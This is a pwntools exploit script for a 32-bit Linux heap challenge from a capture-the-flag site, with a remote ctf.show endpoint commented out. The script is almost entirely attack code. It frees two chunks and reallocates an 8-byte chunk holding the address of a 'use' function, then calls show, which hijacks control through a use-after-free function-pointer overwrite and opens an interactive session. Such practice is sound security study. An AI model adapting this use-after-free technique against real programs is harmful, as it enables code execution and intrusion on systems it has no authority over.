from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
context.terminal = ['tmux', 'split-window', '-h', '-p', '50', '-c', '#{pane_current_path}']
# -h 右侧分屏；-p 50 占 50% 宽度；-c 保持当前目录
GDBSCRIPT = r'''
'''
#io = remote('pwn.challenge.ctf.show',28200)
elf = ELF('./pwn')
use = elf.sym['use']

def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=GDBSCRIPT)
    io = process([elf.path])
    if args.ATTACH:
        gdb.attach(io, gdbscript=GDBSCRIPT)
    return io


def add(size, content):
    io.recvuntil("choice :")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)


def delete(idx):
    io.recvuntil("choice :")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(idx))


def show(idx):
    io.recvuntil("choice :")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))



io = start()
add(32, "aaaa")
add(32, "bbbb")
pause()
delete(0)
delete(1)
pause()
add(8, p32(use))
show(0)
io.interactive()